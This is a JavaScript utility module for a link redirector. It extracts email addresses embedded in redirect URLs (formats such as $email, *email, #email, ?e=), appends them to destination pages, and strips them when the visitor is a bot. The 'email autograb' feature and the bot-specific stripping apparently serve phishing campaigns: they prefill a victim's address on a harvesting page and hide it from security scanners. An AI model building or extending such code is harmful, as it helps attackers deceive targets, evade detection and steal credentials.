/**
 * Email Autograb Utility Functions
 * Extracts and manipulates email parameters in URLs
 */

/**
 * Extract all emails from a URL (any format)
 * Supports: ?email=, ?e=, $email, *email, #email, etc.
 * 
 * @param {string} url - Full URL with potential email parameters
 * @returns {Array} Array of found email addresses
 */
export function extractEmailsFromURL(url) {
  if (!url) return [];
  
  // Decode URL first to handle %24 ($) and %2A (*) and other encoded chars
  let decodedUrl = url;
  try {
    decodedUrl = decodeURIComponent(url);
  } catch (e) {
    // If decoding fails, use original
    decodedUrl = url;
  }
  
  // Regex to find email addresses in the URL
  const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
  const matches = decodedUrl.match(emailRegex);
  
  return matches ? [...new Set(matches)] : []; // Remove duplicates
}

/**
 * Extract everything after the redirect ID (all parameters)
 * This includes query strings, hash fragments, and custom separators
 * 
 * @param {string} originalUrl - The req.originalUrl (e.g., /r/abc123$email@email.com)
 * @param {string} redirectId - The clean redirect ID
 * @returns {string} Everything after the redirect ID (including separators)
 */
export function extractParametersAfterRedirectId(originalUrl, redirectId) {
  if (!originalUrl || !redirectId) return '';
  
  // Decode URL first to handle %24 ($) and %2A (*)
  let decodedUrl = originalUrl;
  try {
    decodedUrl = decodeURIComponent(originalUrl);
  } catch (e) {
    decodedUrl = originalUrl;
  }
  
  // The originalUrl is like: /r/abc123$email@email.com
  // We want to extract: $email@email.com
  
  // Find the redirect ID pattern
  const pattern = `/r/${redirectId}`;
  const patternIndex = decodedUrl.indexOf(pattern);
  
  if (patternIndex === -1) {
    // Try without /r/ prefix (in case it's just the ID)
    const idIndex = decodedUrl.indexOf(redirectId);
    if (idIndex === -1) return '';
    return decodedUrl.substring(idIndex + redirectId.length);
  }
  
  // Extract everything after /r/redirectId
  const afterRedirectId = decodedUrl.substring(patternIndex + pattern.length);
  
  return afterRedirectId;
}

/**
 * Strip email addresses from parameters
 * Used for bot redirects to remove email exposure
 * 
 * @param {string} params - Parameter string (e.g., "$email@email.com" or "?email=test@test.com")
 * @returns {string} Parameters with emails removed
 */
export function stripEmailsFromParams(params) {
  if (!params) return params;
  
  // Remove all email addresses using regex
  const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
  let cleanParams = params.replace(emailRegex, '');
  
  // Clean up empty parameters
  cleanParams = cleanParams.replace(/[?&](\w+)=&/g, '&'); // Remove empty params in middle
  cleanParams = cleanParams.replace(/[?&](\w+)=$/g, '');  // Remove empty params at end
  cleanParams = cleanParams.replace(/\?&/g, '?');          // Fix ?& to ?
  cleanParams = cleanParams.replace(/\?$/g, '');           // Remove trailing ?
  cleanParams = cleanParams.replace(/&$/g, '');            // Remove trailing &
  cleanParams = cleanParams.replace(/[#$*]$/g, '');        // Remove trailing special chars if nothing follows
  
  return cleanParams;
}

/**
 * Append parameters to destination URL
 * Handles all separator types: ?, #, $, *
 * 
 * @param {string} destinationURL - Base destination URL (e.g., https://gmail.com)
 * @param {string} params - Parameters to append (e.g., "$email@email.com" or "?email=test@test.com")
 * @returns {string} Destination URL with appended parameters
 */
export function appendParametersToURL(destinationURL, params) {
  if (!destinationURL) return destinationURL;
  if (!params) return destinationURL;
  
  let resultURL = destinationURL;
  
  // Handle different parameter types
  if (params.startsWith('?')) {
    // Query parameter
    const queryString = params.substring(1); // Remove leading ?
    if (queryString) {
      if (destinationURL.includes('?')) {
        // Destination already has query params, append with &
        resultURL += `&${queryString}`;
      } else {
        // No query params yet, add with ?
        resultURL += `?${queryString}`;
      }
    }
  } else if (params.startsWith('#')) {
    // Hash fragment - always append at end
    resultURL = resultURL.split('#')[0]; // Remove any existing hash
    resultURL += params;
  } else if (params.startsWith('$') || params.startsWith('*')) {
    // Custom separators with @ symbol need a path separator to avoid browser misinterpretation
    // Without a path separator, https://domain.com$test@gmail.com is parsed as https://test@gmail.com
    // With path separator: https://domain.com/$test@gmail.com is correctly parsed
    
    // Ensure destination URL has a trailing slash before appending
    if (!destinationURL.endsWith('/')) {
      resultURL += '/';
    }
    
    // Now append the custom parameter
    resultURL += params;
  } else {
    // Unknown format - ensure trailing slash and append
    if (!destinationURL.endsWith('/')) {
      resultURL += '/';
    }
    resultURL += params;
  }
  
  return resultURL;
}

/**
 * Get parameter format from URL (for analytics)
 * Returns the format used (e.g., "?email=", "$", "#")
 * 
 * @param {string} url - URL containing email
 * @param {string} email - Email address found
 * @returns {string} Parameter format
 */
export function getEmailParameterFormat(url, email) {
  if (!url || !email) return 'unknown';
  
  // Decode URL first
  let decodedUrl = url;
  try {
    decodedUrl = decodeURIComponent(url);
  } catch (e) {
    decodedUrl = url;
  }
  
  // Find where the email appears and what precedes it
  const emailIndex = decodedUrl.indexOf(email);
  if (emailIndex === -1) return 'unknown';
  
  // Look at characters before the email
  const precedingChars = decodedUrl.substring(Math.max(0, emailIndex - 20), emailIndex);
  
  if (precedingChars.includes('?email=')) return '?email=';
  if (precedingChars.includes('?e=')) return '?e=';
  if (precedingChars.includes('&email=')) return '&email=';
  if (precedingChars.includes('&e=')) return '&e=';
  if (precedingChars.includes('?omn=')) return '?omn=';
  if (precedingChars.includes('&omn=')) return '&omn=';
  if (precedingChars.includes('?=')) return '?=';
  if (precedingChars.includes('$')) return '$';
  if (precedingChars.includes('*')) return '*';
  if (precedingChars.includes('#')) return '#';
  
  return 'custom';
}

export default {
  extractEmailsFromURL,
  extractParametersAfterRedirectId,
  stripEmailsFromParams,
  appendParametersToURL,
  getEmailParameterFormat
};
